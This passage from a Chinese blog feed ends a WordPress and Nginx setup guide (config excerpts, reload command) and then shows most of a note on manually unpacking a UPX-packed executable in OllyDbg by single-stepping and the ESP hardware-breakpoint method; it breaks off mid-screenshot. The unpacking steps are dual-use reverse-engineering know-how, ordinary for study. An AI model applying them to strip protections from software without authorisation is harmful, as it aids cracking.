&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;It&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strongly&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;recommended&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;that&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;plugin&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;theme&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;developers&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WP_DEBUG&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;their&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;development&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;environments&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;For&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;information&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;other&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;constants&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;that&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;can&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;be&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;used&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;debugging&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;visit&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Codex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;codex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordpress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Debugging_in_WordPress&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;WP_DEBUG&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;That&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;s all, stop editing! Happy blogging. */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Absolute&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WordPress&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ABSPATH&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ABSPATH&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/usr/share/wordpress&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;/**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Sets&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;up&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WordPress&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vars&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;included&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;require_once&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ABSPATH&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;wp-settings.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;h5 id=&#34;配置nginx&#34;&gt;配置Nginx
&lt;/h5&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;WordPress已经安装完毕，我们配置Nginx把请求转发给PHP-FPM来处理&lt;/p&gt;
&lt;p&gt;首先，重命名默认的配置文件：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd /etc/nginx/conf.d/
mv default.conf defaut.conf.bak
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 &lt;strong&gt;/etc/nginx/conf.d&lt;/strong&gt; 创建 &lt;strong&gt;wordpress.conf&lt;/strong&gt; 配置，参考下面的内容：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;server {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    listen 80;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    root /usr/share/wordpress;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    location / {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        index index.php index.html index.htm;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        try_files $uri $uri/ /index.php index.php;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    location ~ .php$ {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        fastcgi_pass   127.0.0.1:9000;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        fastcgi_index  index.php;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        include        fastcgi_params;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;配置后，通知Nginx进程重新加载：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nginx -s reload
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;3-准备域名和解析&#34;&gt;3. 准备域名和解析
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;h5 id=&#34;注册购买域名&#34;&gt;注册、购买域名
&lt;/h5&gt;&lt;/li&gt;
&lt;li&gt;
&lt;h5 id=&#34;域名解析&#34;&gt;域名解析
&lt;/h5&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ping域名通过后表示可以访问。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【个人笔记】ximo早期发的脱壳教程——手脱UPX壳</title>
        <link>https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/</link>
        <pubDate>Sun, 02 Feb 2020 15:20:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/</guid>
        <description>&lt;h1 id=&#34;个人笔记ximo早期发的脱壳教程手脱upx壳&#34;&gt;【个人笔记】ximo早期发的脱壳教程——手脱UPX壳
&lt;/h1&gt;&lt;p&gt;壳分为两种：压缩壳和加密壳，UPX是一种很简单的压缩壳。&lt;/p&gt;
&lt;p&gt;手脱UPX壳：&lt;/p&gt;
&lt;p&gt;工具：ExeinfoPE、OD&lt;/p&gt;
&lt;p&gt;对象：rmvbfix&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232022335-36792305.png&#34;
	width=&#34;462&#34;
	height=&#34;218&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232022335-36792305_hu7389515903096048184.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232022335-36792305_hu11226871106961060166.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;211&#34;
		data-flex-basis=&#34;508px&#34;
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;方法1单步跟踪&#34;&gt;方法1：单步跟踪
&lt;/h1&gt;&lt;p&gt;将要脱的exe扔进od。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232022674-2060347863.png&#34;
	width=&#34;576&#34;
	height=&#34;79&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232022674-2060347863_hu314622703796445151.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232022674-2060347863_hu4114578511550476656.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;729&#34;
		data-flex-basis=&#34;1749px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这里选择&amp;quot;否&amp;quot;，不然有些操作会出现错误。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232022878-439056064.png&#34;
	width=&#34;566&#34;
	height=&#34;92&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232022878-439056064_hu13595267552156644795.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232022878-439056064_hu219546829396782248.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;615&#34;
		data-flex-basis=&#34;1476px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;进入之后从起点开始单步执行（快捷键F8），遇到pxx注意跳跃方向，手动断点跳过往回跳的指令。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232023167-1749088392.png&#34;
	width=&#34;472&#34;
	height=&#34;91&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232023167-1749088392_hu13500169997303226564.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232023167-1749088392_hu16420707420068847551.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;518&#34;
		data-flex-basis=&#34;1244px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;遇到这种jxx后跟call指令的一并跳过。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232023383-2065700252.png&#34;
	width=&#34;391&#34;
	height=&#34;19&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232023383-2065700252_hu17943622384904011368.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232023383-2065700252_hu1838792607276552655.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;2057&#34;
		data-flex-basis=&#34;4938px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;一直单步知道如上图这样的，跳跃跨度极大，让其跳跃后便可以到达真正的入口：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232023646-742488226.png&#34;
	width=&#34;312&#34;
	height=&#34;18&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232023646-742488226_hu10721331093675190328.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232023646-742488226_hu8150200005741816847.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1733&#34;
		data-flex-basis=&#34;4160px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在入口我们右键便可以用od内工具进行脱壳。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232023879-338089634.png&#34;
	width=&#34;576&#34;
	height=&#34;426&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232023879-338089634_hu10979142380135438754.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232023879-338089634_hu6956773208373775255.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;135&#34;
		data-flex-basis=&#34;324px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232024239-708553624.png&#34;
	width=&#34;402&#34;
	height=&#34;313&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232024239-708553624_hu8036826110772187406.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232024239-708553624_hu2903621479501021648.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;128&#34;
		data-flex-basis=&#34;308px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这里选择方式1/2都可以。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232024481-285253099.png&#34;
	width=&#34;463&#34;
	height=&#34;225&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232024481-285253099_hu8030375935911068739.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232024481-285253099_hu15525366621279206777.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;205&#34;
		data-flex-basis=&#34;493px&#34;
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;方法2esp定律法&#34;&gt;方法2：ESP定律法
&lt;/h1&gt;&lt;p&gt;一进入要先确保硬件断点是清空状态的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232024879-365031608.png&#34;
	width=&#34;207&#34;
	height=&#34;400&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232024879-365031608_hu8292722929614917269.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/1858293-20200202232024879-365031608_hu11627323121695762903.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;51&#34;
